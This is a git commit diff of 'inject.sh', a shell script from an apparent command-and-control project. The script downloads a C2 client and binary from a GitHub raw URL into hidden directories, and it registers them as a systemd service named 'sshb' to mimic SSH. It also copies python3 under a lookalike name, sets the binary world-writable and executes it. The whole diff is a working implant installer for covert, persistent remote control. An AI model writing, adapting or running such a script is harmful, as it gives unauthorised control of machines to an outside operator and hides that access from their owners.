dc1971f20e4dece02c5abcfea183d58d0280ca55
Drew Young <dmy625@comcast.net>
2022-10-11 21:29:35 -0400

    updated inject.sh script

--- inject.sh
+++ inject.sh
@@ -3,14 +3,18 @@ mkdir /var/lib/sshb/
 #Curl the client file into it
 curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /var/lib/sshb/.sshb.py
 curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /usr/local/bin/.client.py
+#copy python
+cp /usr/bin/python3 /usr/bin/python3.1
 #Curl the service file into it
-curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.service > /var/lib/sshb/.sshb.service
+curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.service > /etc/systemd/system/sshb
 #Enable and start the service
-systemctl enable .sshb.service
-systemctl start .sshb.service
+systemctl daemon-reload
+systemctl enable sshb
+systemctl start sshb
 #Curl the binary file to sshb
 curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client > /var/lib/sshb/sshb
+chmod 777 /var/lib/sshb/sshb
+/var/lib/sshb/sshb
 #Tell the user you finished
 echo Finished!
-
-#COPY PYTHON
+systemctl status sshb
